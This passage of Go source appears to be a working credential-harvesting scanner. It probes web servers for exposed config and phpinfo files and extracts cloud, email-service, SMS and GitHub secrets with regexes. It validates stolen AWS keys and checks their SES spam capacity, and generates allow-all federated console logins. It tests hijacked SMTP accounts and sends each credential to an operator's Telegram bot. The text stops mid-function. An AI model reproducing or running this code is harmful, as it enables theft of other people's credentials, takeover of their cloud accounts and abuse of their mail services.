package main

import (
	"bufio"
	"context"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/smtp"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/config"
	"github.com/aws/aws-sdk-go-v2/credentials"
	"github.com/aws/aws-sdk-go-v2/service/servicequotas"
	"github.com/aws/aws-sdk-go-v2/service/ses"
	"github.com/aws/aws-sdk-go-v2/service/sesv2"
	"github.com/aws/aws-sdk-go-v2/service/sns"
	"github.com/aws/aws-sdk-go-v2/service/sts"
)

var (
	RED    = "\033[91m"
	GREEN  = "\033[92m"
	YELLOW = "\033[93m"
	CYAN   = "\033[96m"
	RESET  = "\033[0m"
)

// Hardcoded config path
const defaultConfigPath = "config.json"

type Config struct {
	Telegram struct {
		BotToken string `json:"bot_token"`
		ChatID   string `json:"chat_id"`
	} `json:"telegram"`
	Features struct {
		AWS        bool `json:"aws"`
		SendGrid   bool `json:"sendgrid"`
		Brevo      bool `json:"brevo"`
		XSMTP      bool `json:"xsmtp"`
		Tencent    bool `json:"tencent"`
		Mailgun    bool `json:"mailgun"`
		NewMailgun bool `json:"new_mailgun"`
		Mandrill   bool `json:"mandrill"`
		MailerSend bool `json:"mailersend"`
		GitHub     bool `json:"github"`
		Twilio     bool `json:"twilio"`
		Nexmo      bool `json:"nexmo"`
		Telnyx     bool `json:"telnyx"`
		SMTP       bool `json:"smtp"`
	} `json:"features"`
	AWSChecks struct {
		SES        bool `json:"ses"`
		SNS        bool `json:"sns"`
		Fargate    bool `json:"fargate"`
		Federation bool `json:"federation"`
	} `json:"aws_checks"`
	SMTPTestEmail string `json:"smtp_test_email"`
}

func loadConfig(path string) (*Config, error) {
	b, err := ioutil.ReadFile(path)
	if err != nil {
		return nil, err
	}
	var cfg Config
	if err := json.Unmarshal(b, &cfg); err != nil {
		return nil, err
	}
	return &cfg, nil
}

func printProgressBar(current, total int) {
	barLength := 40
	progress := float64(current) / float64(total)
	filledLength := int(progress * float64(barLength))
	bar := strings.Repeat("█", filledLength) + strings.Repeat("-", barLength-filledLength)
	fmt.Printf("\r%s[%s] %d/%d (%.1f%%)%s", CYAN, bar, current, total, progress*100, RESET)
	if current == total {
		fmt.Print("\n")
	}
}

func randomString(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[int(time.Now().UnixNano())%len(charset)]
	}
	return string(b)
}

type AWSScanner struct {
	Config           *Config
	BlacklistPattern *regexp.Regexp

	AWSAccessKeyPattern          *regexp.Regexp
	AWSSecretKeyPattern          *regexp.Regexp
	SendGridAPIKeyPattern        *regexp.Regexp
	BrevoAPIKeyPattern           *regexp.Regexp
	XSMTPAPIKeyPattern           *regexp.Regexp
	TencentAccessKeyPattern      *regexp.Regexp
	MailgunAPIKeyPattern         *regexp.Regexp
	MandrillAppAPIKeyPattern     *regexp.Regexp
	MailerSendAPIKeyPattern      *regexp.Regexp
	NewMailgunAPIKeyPattern      *regexp.Regexp
	GitHubAccessTokenPattern     *regexp.Regexp
	AWSRandomPattern             *regexp.Regexp
	DefaultRegion                string
	AWSAccessKeyPatternInfo      *regexp.Regexp
	AWSSecretKeyPatternInfo      *regexp.Regexp
	SendGridAPIKeyPatternInfo    *regexp.Regexp
	MailgunAPIKeyPatternInfo     *regexp.Regexp
	GitHubAccessTokenPatternInfo *regexp.Regexp
	
	// Twilio patterns - updated with multiple methods
	TwilioSIDPatternInfo         *regexp.Regexp
	TwilioAuthPatternInfo        *regexp.Regexp
	TwilioAuthPatternV2Info      *regexp.Regexp
	TwilioEncodePatternInfo      *regexp.Regexp
	
	// Nexmo patterns
	NexmoApiPatternInfo          *regexp.Regexp
	NexmoSecretPatternInfo       *regexp.Regexp
	
	// Telnyx patterns - updated to only include API key
	TelnyxApiPatternInfo         *regexp.Regexp

	PHPInfoPaths []string
	EnvPaths     []string

	SMTPHostPattern *regexp.Regexp
	SMTPPortPattern *regexp.Regexp
	SMTPUserPattern *regexp.Regexp
	SMTPPassPattern *regexp.Regexp
	SMTPFromPattern *regexp.Regexp
}

func NewAWSScanner(configPath string) *AWSScanner {
	cfg, err := loadConfig(configPath)
	if err != nil {
		fmt.Printf("%s[X]%s Failed to load config: %v\n", RED, RESET, err)
		os.Exit(1)
	}
	blacklist := []string{"cloudflare", "bootstrap", "jquery", "/wp-content/", "/jwplayer.js", "awstatic"}
	blacklistPattern := regexp.MustCompile(strings.Join(blacklist, "|"))
	phpinfoPaths := []string{
		"/infophp.php",
		"/php_info.php",
		"/test.php",
		"/i.php",
		"/asdf.php",
		"/pinfo.php",
		"/phpversion.php",
		"/time.php",
		"/temp.php",
		"/old_phpinfo.php",
		"/infos.php",
		"/linusadmin-phpinfo.php",
		"/php-info.php",
		"/dashboard/phpinfo.php",
		"/phpinfo.php3",
		"/phpinfo.php4",
		"/phpinfo.php5",
		"/phpinfos.php",
		"/_profiler/phpinfo.php",
		"/public/client/planinfo",
		"/_profiler/phpinfo",
		"/phpinfo.php",
		"/info.php",
		"/aws.yml",
		"/config/aws.yml",
		"/symfony/_profiler/phpinfo",
		"/phpinfo",
		"/.remote",
		"/.local",
		"/.production",
		"/.aws/config",
		"/.aws/credentials",
		"/config.js",
		"/helpers/utility.js",
		"/config/config.json",
		"/wp-config.php.bak",
		"/wp-config.php",
		"/.wp-config.php.swp",
		"/wp-config.php.old",
		"/.vscode/sftp.json",
		"/.vscode/settings.json",
		"/.ssh/sftp-config.json",
		"/sftp-config.json",
		"/sftp.json",
		"/prevlaravel/sftp-config.json",
		"/index.php/phpinfo",
		"/application/config/constants.php/",
		"/dev/phpinfo.php",
		"/test2.php",
		"/test1.php",
		"/frontend_dev.php/$",
		"/login/index.php",
		"/install/index.php",
		"/config.php",
		"/php.php",
		"/config/app.php",
		"/config/database.php",
		"/config/mail.php",
		"/config/cache.php",
		"/config/queue.php",
		"/config/session.php",
		"/config/view.php",
		"/config/auth.php",
		"/config/filesystems.php",
		"/config/services.php",
		"/application/config/config.php",
		"/application/config/database.php",
		"/application/config/email.php",
		"/application/config/autoload.php",
		"/application/config/routes.php",
		"/application/config/constants.php",
		"/application/config/mimes.php",
		"/application/config/hooks.php",
		"/application/config/encryption.php",
		"/application/config/profiler.php",
		"/config/broadcasting.php",
		"/application/config/doctypes.php",
		"/application/config/foreign_chars.php",
		"/application/config/migration.php",
		"/config/app_local.php",
		"/config/bootstrap.php",
		"/config/app.default.php",
		"/config/routes.php",
		"/config/paths.php",
		"/config/cli_bootstrap.php",
		"/config/requirements.php",
		"/config/autoload/global.php",
		"/config/autoload/local.php",
		"/config/application.config.php",
		"config/module.config.php",
		"/config/database.config.php",
		"/config/development.config.php",
		"/config/production.config.php",
		"/config/test.config.php",
		"/config/security.config.php",
		"/config/acl.config.php",
		"/app/etc/config.php",
		"/app/etc/config.local.php",
		"/config/php.ini",
		"/app_dev.php/_profiler/phpinfo",
		"/secured/phpinfo.php",
		"/config/config.php",
		"/?phpinfo=1",
		"/config/module.config.php",
		"/appsettings.json",
		"/config/default.json",
		"/config/aws.json",
		"/api/config/tsconfig.json",
		"/config/development.json",
		"/settings.json",
		"/manifest.json",
		"/config.json",
		"/config/production.json",
		"/appsettings.Development.json",
		"/appsettings.Production.json",
		"/appsettings.Test.json",
		"/launchSettings.json",
		"/bundleconfig.json",
		"/angular.json",
		"/tsconfig.json",
		"/tsconfig.app.json",
		"/tsconfig.spec.json",
		"/config/test.json",
		"/appsettings.Staging.json",
		"/hosting.json",
		"/config/settings.json",
		"/meteor.settings.json",
		"/Properties/launchSettings.json",
		"/appsettings.QA.json",
		"/appsettings.Local.json",
		"/src/config/config.json",
		"/src/settings.json",
		"/private/config.json",
		"/config/dev.json",
		"/config/prod.json",
		"/config/staging.json",
		"/config/local.json",
		"/conf/application.json",
		"/.docker/config.json",
		"/config/daemon.json",
	}
	envPaths := loadEnvPaths()
	return &AWSScanner{
		Config:                       cfg,
		BlacklistPattern:             blacklistPattern,
		AWSAccessKeyPattern:          regexp.MustCompile(`['"](AKIA[0-9A-Z]{16})['"]`),
		AWSSecretKeyPattern:          regexp.MustCompile(`['"]([A-Za-z0-9/+=]{40})['"]`),
		SendGridAPIKeyPattern:        regexp.MustCompile(`SG\.[0-9A-Za-z\-_]{22}\.[0-9A-Za-z\-_]{43}`),
		BrevoAPIKeyPattern:           regexp.MustCompile(`xkeysib-[a-zA-Z0-9]{64}-[a-zA-Z0-9]{16}`),
		XSMTPAPIKeyPattern:           regexp.MustCompile(`xsmtpsib-[a-fA-F0-9]{64}-[a-zA-Z0-9]{16}`),
		TencentAccessKeyPattern:      regexp.MustCompile(`['"]AKID[a-zA-Z0-9]{32}['"]`),
		MailgunAPIKeyPattern:         regexp.MustCompile(`key-[0-9a-zA-Z]{32}`),
		MandrillAppAPIKeyPattern:     regexp.MustCompile(`['"]md-[0-9a-zA-Z]{22}['"]`),
		MailerSendAPIKeyPattern:      regexp.MustCompile(`mlsn.-[0-9a-zA-Z]{70}`),
		NewMailgunAPIKeyPattern:      regexp.MustCompile(`[a-f0-9]{32}-[0-9a-f]{8}-[a-f0-9]{8}`),
		GitHubAccessTokenPattern:     regexp.MustCompile(`gh[oprus]_[A-Za-z0-9]{36}`),
		
		// Updated Twilio patterns with multiple detection methods
		TwilioSIDPatternInfo:         regexp.MustCompile(`AC[a-f0-9]{32}`),
		TwilioAuthPatternInfo:        regexp.MustCompile(`(?i)['"']?([0-9a-f]{32})['"']?`),
		TwilioAuthPatternV2Info:      regexp.MustCompile(`(?i)<td class="v">([0-9a-f]{32})</td>`),
		TwilioEncodePatternInfo:      regexp.MustCompile(`QU[MN][A-Za-z0-9]{87}==`),
		
		NexmoApiPatternInfo:          regexp.MustCompile(`(?i)(NEXMO_API_KEY|VONAGE_API_KEY)\s*[:=]\s*["']?(\d{6,20})["']?`),
		NexmoSecretPatternInfo:       regexp.MustCompile(`(?i)(NEXMO_API_SECRET|VONAGE_API_SECRET)\s*[:=]\s*["']?([a-zA-Z0-9]{6,40})["']?`),
		
		// Updated Telnyx pattern - only API key, no secret
		TelnyxApiPatternInfo:         regexp.MustCompile(`KEY[A-Z0-9]{32}_[A-Za-z0-9]{22}`),
		
		AWSRandomPattern:             regexp.MustCompile(`email-smtp\.[a-z0-9\-]+\.amazonaws\.com.*?(AKIA[0-9A-Z]{16})`),
		DefaultRegion:                "us-east-1",
		AWSAccessKeyPatternInfo:      regexp.MustCompile(`\bAKIA[0-9A-Z]{16}\b`),
		AWSSecretKeyPatternInfo:      regexp.MustCompile(`\b[A-Za-z0-9/+=]{40}\b`),
		SendGridAPIKeyPatternInfo:    regexp.MustCompile(`\bSG\.[0-9A-Za-z\-_]{22}\.[0-9A-Za-z\-_]{43}\b`),
		MailgunAPIKeyPatternInfo:     regexp.MustCompile(`\bkey-[0-9a-zA-Z]{32}\b`),
		GitHubAccessTokenPatternInfo: regexp.MustCompile(`\bgh[oprus]_[A-Za-z0-9]{36}\b`),
		PHPInfoPaths:                 phpinfoPaths,
		EnvPaths:                     envPaths,
		SMTPHostPattern:              regexp.MustCompile(`(?i)MAIL_HOST\s*[:=]\s*([^\s'"]+)`),
		SMTPPortPattern:              regexp.MustCompile(`(?i)MAIL_PORT\s*[:=]\s*([0-9]+)`),
		SMTPUserPattern:              regexp.MustCompile(`(?i)MAIL_USERNAME\s*[:=]\s*([^\s'"]+)`),
		SMTPPassPattern:              regexp.MustCompile(`(?i)MAIL_PASSWORD\s*[:=]\s*([^\s'"]+)`),
		SMTPFromPattern:              regexp.MustCompile(`(?i)MAIL_FROM\s*[:=]\s*([^\s'"]+)`),
	}
}

func (a *AWSScanner) sendTelegram(message string) {
	if a.Config.Telegram.BotToken == "" || a.Config.Telegram.ChatID == "" {
		return
	}
	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", a.Config.Telegram.BotToken)
	data := url.Values{}
	data.Set("chat_id", a.Config.Telegram.ChatID)
	data.Set("text", message)
	data.Set("parse_mode", "HTML")
	http.PostForm(apiURL, data)
}

func (a *AWSScanner) saveIntoFile(line, filename string) {
	os.MkdirAll("ResultJS", 0755)
	f, err := os.OpenFile(filepath.Join("ResultJS", filename), os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err == nil {
		defer f.Close()
		f.WriteString(line + "\n")
	}
}

func (a *AWSScanner) alreadySent(ak, sk string) bool {
	path := filepath.Join("ResultJS", "aws_valid.txt")
	b, err := ioutil.ReadFile(path)
	if err != nil {
		return false
	}
	return strings.Contains(string(b), fmt.Sprintf("%s:%s", ak, sk))
}

func (a *AWSScanner) validateAWSCredentials(accessKey, secretKey string) (bool, *sts.GetCallerIdentityOutput, aws.Config) {
	ctx := context.Background()
	cfg, err := config.LoadDefaultConfig(ctx,
		config.WithRegion(a.DefaultRegion),
		config.WithCredentialsProvider(credentials.NewStaticCredentialsProvider(accessKey, secretKey, "")),
	)
	if err != nil {
		return false, nil, aws.Config{}
	}
	stsClient := sts.NewFromConfig(cfg)
	identity, err := stsClient.GetCallerIdentity(ctx, &sts.GetCallerIdentityInput{})
	if err != nil {
		return false, nil, aws.Config{}
	}
	return true, identity, cfg
}

func getAllRegions(service string) ([]string, error) {
	return []string{
		"us-east-1", "us-east-2", "us-west-1", "us-west-2",
		"af-south-1", "ap-east-1", "ap-south-1", "ap-northeast-1", "ap-northeast-2", "ap-northeast-3",
		"ap-southeast-1", "ap-southeast-2", "ap-southeast-3", "ca-central-1",
		"eu-central-1", "eu-west-1", "eu-west-2", "eu-west-3", "eu-north-1", "eu-south-1", "eu-south-2", "eu-central-2",
		"me-south-1", "me-central-1", "sa-east-1",
	}, nil
}

func (a *AWSScanner) checkSESDetailsAllRegions(cfg aws.Config) map[string]map[string]interface{} {
	if !(a.Config.Features.AWS && a.Config.AWSChecks.SES) {
		return map[string]map[string]interface{}{}
	}
	ctx := context.Background()
	results := make(map[string]map[string]interface{})
	regions, _ := getAllRegions("ses")
	for _, region := range regions {
		cfg.Region = region
		sesClient := ses.NewFromConfig(cfg)
		sesv2Client := sesv2.NewFromConfig(cfg)
		quota, err := sesClient.GetSendQuota(ctx, &ses.GetSendQuotaInput{})
		if err != nil {
			continue
		}
		account, err := sesv2Client.GetAccount(ctx, &sesv2.GetAccountInput{})
		health := "Unknown"
		if err == nil && account.EnforcementStatus != nil && *account.EnforcementStatus != "" {
			health = *account.EnforcementStatus
		}
		if quota.Max24HourSend > 0 {
			results[region] = map[string]interface{}{
				"SendQuota":    quota.Max24HourSend,
				"LastSend":     quota.SentLast24Hours,
				"HealthStatus": health,
			}
		}
	}
	return results
}

func (a *AWSScanner) checkSNSLimitAllRegions(cfg aws.Config) map[string]float64 {
	if !(a.Config.Features.AWS && a.Config.AWSChecks.SNS) {
		return map[string]float64{}
	}
	ctx := context.Background()
	results := make(map[string]float64)
	regions, _ := getAllRegions("sns")
	for _, region := range regions {
		cfg.Region = region
		snsClient := sns.NewFromConfig(cfg)
		out, err := snsClient.GetSMSAttributes(ctx, &sns.GetSMSAttributesInput{
			Attributes: []string{"MonthlySpendLimit"},
		})
		if err != nil {
			continue
		}
		if val, ok := out.Attributes["MonthlySpendLimit"]; ok {
			limit, _ := strconv.ParseFloat(val, 64)
			if limit > 0 {
				results[region] = limit
			}
		}
	}
	return results
}

func (a *AWSScanner) checkFargateOnDemandLimitAllRegions(cfg aws.Config) map[string]float64 {
	if !(a.Config.Features.AWS && a.Config.AWSChecks.Fargate) {
		return map[string]float64{}
	}
	ctx := context.Background()
	limits := make(map[string]float64)
	regions, _ := getAllRegions("fargate")
	for _, region := range regions {
		cfg.Region = region
		client := servicequotas.NewFromConfig(cfg)
		quota, err := client.GetServiceQuota(ctx, &servicequotas.GetServiceQuotaInput{
			ServiceCode: aws.String("fargate"),
			QuotaCode:   aws.String("L-F4011B99"),
		})
		if err != nil || quota.Quota == nil || quota.Quota.Value == nil {
			continue
		}
		limits[region] = *quota.Quota.Value
	}
	return limits
}

func (a *AWSScanner) getFederationConsoleURL(cfg aws.Config, durationSeconds int32) map[string]string {
	if !(a.Config.Features.AWS && a.Config.AWSChecks.Federation) {
		return nil
	}
	ctx := context.Background()
	stsClient := sts.NewFromConfig(cfg)
	identity, err := stsClient.GetCallerIdentity(ctx, &sts.GetCallerIdentityInput{})
	if err != nil {
		return nil
	}
	sessionName := "FederatedUser" + randomString(6)
	policy := map[string]interface{}{
		"Version": "2012-10-17",
		"Statement": []map[string]interface{}{
			{
				"Effect":   "Allow",
				"Action":   "*",
				"Resource": "*",
			},
		},
	}
	policyBytes, _ := json.Marshal(policy)
	getToken, err := stsClient.GetFederationToken(ctx, &sts.GetFederationTokenInput{
		Name:            aws.String(sessionName),
		Policy:          aws.String(string(policyBytes)),
		DurationSeconds: aws.Int32(durationSeconds),
	})
	if err != nil {
		return nil
	}
	creds := getToken.Credentials
	sessionJson, _ := json.Marshal(map[string]string{
		"sessionId":    *creds.AccessKeyId,
		"sessionKey":   *creds.SecretAccessKey,
		"sessionToken": *creds.SessionToken,
	})
	signinURL := "https://signin.aws.amazon.com/federation"
	getTokenURL := fmt.Sprintf("%s?Action=getSigninToken&Session=%s", signinURL, url.QueryEscape(string(sessionJson)))
	resp, err := http.Get(getTokenURL)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()
	body, _ := ioutil.ReadAll(resp.Body)
	var tokenResp struct {
		SigninToken string `json:"SigninToken"`
	}
	json.Unmarshal(body, &tokenResp)
	destination := "https://console.aws.amazon.com/"
	finalURL := fmt.Sprintf("%s?Action=login&Issuer=aws_scanner&Destination=%s&SigninToken=%s",
		signinURL, url.QueryEscape(destination), url.QueryEscape(tokenResp.SigninToken))
	return map[string]string{
		"federation_console_url": finalURL,
		"session_name":           sessionName,
		"expires_at":             creds.Expiration.Format(time.RFC3339),
		"arn":                    *identity.Arn,
	}
}

func unique(input []string) []string {
	m := make(map[string]struct{})
	var out []string
	for _, s := range input {
		if _, ok := m[s]; !ok {
			m[s] = struct{}{}
			out = append(out, s)
		}
	}
	return out
}

func (a *AWSScanner) extractAndTestSMTP(text, sourceURL string) {
	// Integrate with config: check if SMTP feature is enabled
	if a.Config == nil || !a.Config.Features.SMTP {
		return
	}

	host := ""
	port := ""
	user := ""
	pass := ""
	from := ""

	if m := a.SMTPHostPattern.FindStringSubmatch(text); len(m) > 1 {
		host = m[1]
	}
	if m := a.SMTPPortPattern.FindStringSubmatch(text); len(m) > 1 {
		port = m[1]
	}
	if m := a.SMTPUserPattern.FindStringSubmatch(text); len(m) > 1 {
		user = m[1]
	}
	if m := a.SMTPPassPattern.FindStringSubmatch(text); len(m) > 1 {
		pass = m[1]
	}
	if m := a.SMTPFromPattern.FindStringSubmatch(text); len(m) > 1 {
		from = m[1]
	}

	if host != "" && port != "" && user != "" && pass != "" && from != "" {
		smtpLine := fmt.Sprintf("%s:%s:%s:%s:%s", host, port, user, pass, from)
		fmt.Printf("%s[SMTP]%s Found SMTP: %s from %s\n", CYAN, RESET, smtpLine, sourceURL)
		a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, smtpLine), "smtp_found.txt")

		// Use test email from config if available, else fallback
		if a.Config == nil || a.Config.SMTPTestEmail == "" {
			return // Tidak ada email test di config, hentikan
		}
		testTo := a.Config.SMTPTestEmail

		subject := "SMTP Test from Raven X Scanner"
		body := "This is a test email sent by Raven X Scanner to verify SMTP credentials."
		msg := fmt.Sprintf("From: %s\r\nTo: %s\r\nSubject: %s\r\n\r\n%s", from, testTo, subject, body)

		addr := fmt.Sprintf("%s:%s", host, port)
		auth := smtp.PlainAuth("", user, pass, host)
		err := smtp.SendMail(addr, auth, from, []string{testTo}, []byte(msg))

		status := "✅ Test email sent successfully"
		if err != nil {
			status = fmt.Sprintf("❌ Failed to send test email: %v", err)
		}

		telegramMsg := fmt.Sprintf(
			"<b>SMTP Credentials Found</b>\nSource: <code>%s</code>\n<code>MAIL_HOST: %s\nMAIL_PORT: %s\nMAIL_USERNAME: %s\nMAIL_PASSWORD: %s\nMAIL_FROM: %s</code>\nTest Email: %s",
			sourceURL, host, port, user, pass, from, status,
		)
		go a.sendTelegram(telegramMsg)
	}
}

// Updated function to detect Twilio credentials with multiple methods
func (a *AWSScanner) extractTwilioCredentials(text, sourceURL string) {
	if !a.Config.Features.Twilio {
		return
	}

	// Find all SIDs
	sids := unique(a.TwilioSIDPatternInfo.FindAllString(text, -1))
	
	// Find auth tokens using multiple patterns
	var authTokens []string
	
	// Method 1: Standard pattern
	authTokenMatches := a.TwilioAuthPatternInfo.FindAllStringSubmatch(text, -1)
	for _, match := range authTokenMatches {
		if len(match) > 1 {
			authTokens = append(authTokens, match[1])
		}
	}
	
	// Method 2: HTML table pattern (for phpinfo)
	authTokenV2Matches := a.TwilioAuthPatternV2Info.FindAllStringSubmatch(text, -1)
	for _, match := range authTokenV2Matches {
		if len(match) > 1 {
			authTokens = append(authTokens, match[1])
		}
	}
	
	// Method 3: Encoded pattern
	encodedTokens := unique(a.TwilioEncodePatternInfo.FindAllString(text, -1))
	for _, encoded := range encodedTokens {
		authTokens = append(authTokens, encoded)
	}
	
	// Remove duplicates from auth tokens
	authTokens = unique(authTokens)
	
	// Match SIDs with Auth Tokens
	for _, sid := range sids {
		for _, authToken := range authTokens {
			twilioLine := fmt.Sprintf("%s:%s:%s", sourceURL, sid, authToken)
			fmt.Printf("%s[!]%s Twilio Credentials Found: %s from %s\n", YELLOW, RESET, twilioLine, sourceURL)
			a.saveIntoFile(twilioLine, "twilio_credentials.txt")
			go a.sendTelegram(fmt.Sprintf("🔑 <b>Twilio Credentials Found</b>\nURL: <code>%s</code>\nSID: <code>%s</code>\nAuth Token: <code>%s</code>", sourceURL, sid, authToken))
		}
	}
}

// Only send valid API keys to Telegram
func (a *AWSScanner) checkAndSaveKeys(text, sourceURL string) {
	if a.Config.Features.Mailgun {
		for _, key := range unique(a.MailgunAPIKeyPattern.FindAllString(text, -1)) {
			fmt.Printf("%s[!]%s Mailgun Key Found: %s from %s\n", YELLOW, RESET, key, sourceURL)
			a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "mailgun_key.txt")
			a.checkMailgunKey(key, sourceURL)
		}
	}

	if a.Config.Features.SendGrid {
		for _, key := range unique(a.SendGridAPIKeyPattern.FindAllString(text, -1)) {
			fmt.Printf("%s[!]%s SendGrid Key Found: %s from %s\n", YELLOW, RESET, key, sourceURL)
			a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "sendgrid_key.txt")
			a.checkSendGridKey(key, sourceURL)
		}
	}
	if a.Config.Features.Brevo {
		for _, key := range unique(a.BrevoAPIKeyPattern.FindAllString(text, -1)) {
			fmt.Printf("%s[!]%s Brevo Key Found: %s from %s\n", YELLOW, RESET, key, sourceURL)
			a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "brevo_key.txt")
			a.checkBrevoKey(key, sourceURL)
		}
	}

	if a.Config.Features.XSMTP {
		for _, key := range unique(a.XSMTPAPIKeyPattern.FindAllString(text, -1)) {
			fmt.Printf("%s[!]%s XSMTP Key Found: %s from %s\n", YELLOW, RESET, key, sourceURL)
			a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "xsmtp_key.txt")
		}
	}
	if a.Config.Features.Tencent {
		for _, key := range unique(a.TencentAccessKeyPattern.FindAllString(text, -1)) {
			fmt.Printf("%s[!]%s Tencent Access Key Found: %s from %s\n", YELLOW, RESET, key, sourceURL)
			a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "tencent_key.txt")
		}
	}
	if a.Config.Features.Mandrill {
		for _, key := range unique(a.MandrillAppAPIKeyPattern.FindAllString(text, -1)) {
			fmt.Printf("%s[!]%s MandrillApp Key Found: %s from %s\n", YELLOW, RESET, key, sourceURL)
			a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "mandrillapp_key.txt")
		}
	}
	if a.Config.Features.MailerSend {
		for _, key := range unique(a.MailerSendAPIKeyPattern.FindAllString(text, -1)) {
			fmt.Printf("%s[!]%s MailerSend Key Found: %s from %s\n", YELLOW, RESET, key, sourceURL)
			a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "mailersend_key.txt")
		}
	}
	if a.Config.Features.NewMailgun {
		for _, key := range unique(a.NewMailgunAPIKeyPattern.FindAllString(text, -1)) {
			fmt.Printf("%s[!]%s New Mailgun Key Found: %s from %s\n", YELLOW, RESET, key, sourceURL)
			a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "newmailgun_key.txt")
		}
	}
	if a.Config.Features.GitHub {
		for _, key := range unique(a.GitHubAccessTokenPattern.FindAllString(text, -1)) {
			fmt.Printf("%s[!]%s GitHub Access Token Found: %s from %s\n", YELLOW, RESET, key, sourceURL)
			a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "github_token.txt")
		}
	}

	// Use updated Twilio extraction method
	a.extractTwilioCredentials(text, sourceURL)

	// Tambahkan deteksi Nexmo
	if a.Config.Features.Nexmo {
		apiKeyMatches := a.NexmoApiPatternInfo.FindAllStringSubmatch(text, -1)
		apiSecretMatches := a.NexmoSecretPatternInfo.FindAllStringSubmatch(text, -1)

		for _, keyMatch := range apiKeyMatches {
			if len(keyMatch) > 2 {
				apiKey := keyMatch[2]
				for _, secretMatch := range apiSecretMatches {
					if len(secretMatch) > 2 {
						apiSecret := secretMatch[2]
						nexmoLine := fmt.Sprintf("%s:%s:%s", sourceURL, apiKey, apiSecret)
						fmt.Printf("%s[!]%s Nexmo Credentials Found: %s from %s\n", YELLOW, RESET, nexmoLine, sourceURL)
						a.saveIntoFile(nexmoLine, "nexmo_credentials.txt")
						go a.sendTelegram(fmt.Sprintf("🔑 <b>Nexmo Credentials Found</b>\nURL: <code>%s</code>\nAPI Key: <code>%s</code>\nAPI Secret: <code>%s</code>", sourceURL, apiKey, apiSecret))
					}
				}
			}
		}
	}

	// Updated Telnyx detection - only API key, no secret
	if a.Config.Features.Telnyx {
		apiKeys := unique(a.TelnyxApiPatternInfo.FindAllString(text, -1))
		for _, apiKey := range apiKeys {
			telnyxLine := fmt.Sprintf("%s:%s", sourceURL, apiKey)
			fmt.Printf("%s[!]%s Telnyx API Key Found: %s from %s\n", YELLOW, RESET, telnyxLine, sourceURL)
			a.saveIntoFile(telnyxLine, "telnyx_credentials.txt")
			go a.sendTelegram(fmt.Sprintf("🔑 <b>Telnyx API Key Found</b>\nURL: <code>%s</code>\nAPI Key: <code>%s</code>", sourceURL, apiKey))
		}
	}

	a.extractAndTestSMTP(text, sourceURL)
}

func (a *AWSScanner) checkAndSaveKeysFromDir(text, sourceURL string) {
	if a.Config.Features.AWS {
		aks := unique(a.AWSAccessKeyPatternInfo.FindAllString(text, -1))
		sks := unique(a.AWSSecretKeyPatternInfo.FindAllString(text, -1))

		for _, ak := range aks {
			for _, sk := range sks {
				if !strings.ContainsAny(sk, "ABCDEFGHIJKLMNOPQRSTUVWXYZ") || !strings.ContainsAny(sk, "0123456789") {
					continue
				}
				if a.alreadySent(ak, sk) {
					continue
				}
				fmt.Printf("%s[✓]%s AWS (dir): %s:%s from %s\n", GREEN, RESET, ak, sk, sourceURL)
				valid, identity, cfg := a.validateAWSCredentials(ak, sk)
				if !valid {
					continue
				}
				a.saveIntoFile(fmt.Sprintf("%s:%s", ak, sk), "aws_valid.txt")
				a.saveIntoFile(fmt.Sprintf("%s:%s:%s:%s", sourceURL, ak, sk, a.DefaultRegion), "aws_credentials.txt")

				sesInfo := a.checkSESDetailsAllRegions(cfg)
				snsInfo := a.checkSNSLimitAllRegions(cfg)
				fargateInfo := a.checkFargateOnDemandLimitAllRegions(cfg)
				federationInfo := a.getFederationConsoleURL(cfg, 43200)

				type sesRegionDetail struct {
					Region      string
					Quota       float64
					LastSend    float64
					Health      string
					HealthUpper string
				}

				var sesRegions []sesRegionDetail
				var above200Regions []sesRegionDetail
				var usEast1Detail *sesRegionDetail

				sesReport := ""
				if len(sesInfo) > 0 {
					sesReport += "📧 SES Quota Info (All Regions)\n"
					for region, details := range sesInfo {
						quota := details["SendQuota"].(float64)
						lastSend := details["LastSend"].(float64)
						health := details["HealthStatus"].(string)
						healthUpper := strings.ToUpper(health)
						healthEmoji := "❤️"
						if healthUpper != "HEALTHY" {
							healthEmoji = "❌"
						}
						sesReport += fmt.Sprintf("  ├ 📍 Region: %s\n  ├ 📦 Quota: %.0f\n  ├ 📤 Sent (24h): %.0f\n  └ %s Health: %s\n",
							region, quota, lastSend, healthEmoji, health)
						detail := sesRegionDetail{
							Region:      region,
							Quota:       quota,
							LastSend:    lastSend,
							Health:      health,
							HealthUpper: healthUpper,
						}
						sesRegions = append(sesRegions, detail)
						if quota > 200 {
							above200Regions = append(above200Regions, detail)
						}
						if region == "us-east-1" && quota == 200 {
							tmp := detail
							usEast1Detail = &tmp
						}
					}
				} else {
					sesReport += "📧 SES Quota Info\n- No SES quota found in any region\n"
				}

				shouldSend := false
				sendRegions := []sesRegionDetail{}

				if len(above200Regions) > 0 {
					for _, d := range above200Regions {
						if d.HealthUpper == "HEALTHY" || d.HealthUpper == "PROBATION" {
							sendRegions = append(sendRegions, d)
						}
					}
					if len(sendRegions) > 0 {
						shouldSend = true
					}
				} else if usEast1Detail != nil {
					sendRegions = append(sendRegions, *usEast1Detail)
					shouldSend = true
				} else {
					if len(sesInfo) > 0 || len(snsInfo) > 0 || len(fargateInfo) > 0 || (federationInfo != nil && federationInfo["federation_console_url"] != "") {
						shouldSend = true
					}
				}

				snsReport := ""
				if len(snsInfo) > 0 {
